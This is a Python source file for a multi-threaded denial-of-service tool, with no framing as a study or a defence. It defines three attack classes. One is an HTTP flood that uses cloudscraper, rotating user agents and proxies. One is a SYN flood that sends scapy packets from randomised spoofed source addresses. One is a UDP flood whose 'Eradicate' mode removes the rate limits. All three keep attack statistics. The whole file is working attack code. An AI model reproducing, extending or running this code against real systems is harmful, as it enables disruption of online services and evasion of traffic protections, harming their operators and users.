import threading
import socket
import random
import time

import requests
import cloudscraper
from scapy.all import IP, TCP, UDP, send as scapy_send, RandShort

import config

class AttackVector(threading.Thread):
    def __init__(self, mode, **kwargs):
        super().__init__()
        self.mode = mode
        self.daemon = True
        self.target_ip = kwargs.get('target_ip')
        self.target_port = kwargs.get('target_port')
        self.target_url = kwargs.get('target_url')
    
    def run(self):
        config.attack_stats["active_threads"] += 1
        try:
            while not config.stop_event.is_set():
                self.execute()
        except Exception:
            config.attack_stats["errors"] += 1
        finally:
            config.attack_stats["active_threads"] -= 1

class L7_HTTPFlood(AttackVector):
    def execute(self):
        scraper = cloudscraper.create_scraper()
        headers = {'User-Agent': random.choice(config.user_agents), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'no-cache'}
        proxy = {'http': f"http://{random.choice(config.proxies)}", 'https': f"http://{random.choice(config.proxies)}"} if config.proxies else None
        try:
            response = scraper.get(self.target_url, headers=headers, proxies=proxy, timeout=5)
            request_size = sum(len(k) + len(v) for k, v in headers.items()) + len(self.target_url)
            config.attack_stats["bytes_sent"] += request_size
            config.attack_stats["l7_requests"] += 1
            if response.status_code >= 400: config.attack_stats["errors"] += 1
        except requests.exceptions.RequestException:
            config.attack_stats["errors"] += 1

class L4_SYNFlood(AttackVector):
    def execute(self):
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        packet = IP(src=src_ip, dst=self.target_ip) / TCP(sport=RandShort(), dport=self.target_port, flags="S")
        scapy_send(packet, verbose=False)
        config.attack_stats["l4_packets"] += 1
        config.attack_stats["bytes_sent"] += len(packet)
        if self.mode != "Eradicate": time.sleep(0.01)

class L4_UDPFlood(AttackVector):
    def execute(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024 if self.mode != "Eradicate" else 4096)
        sock.sendto(payload, (self.target_ip, self.target_port))
        config.attack_stats["l4_packets"] += 1
        config.attack_stats["bytes_sent"] += len(payload)
        if self.mode != "Eradicate": time.sleep(0.005)
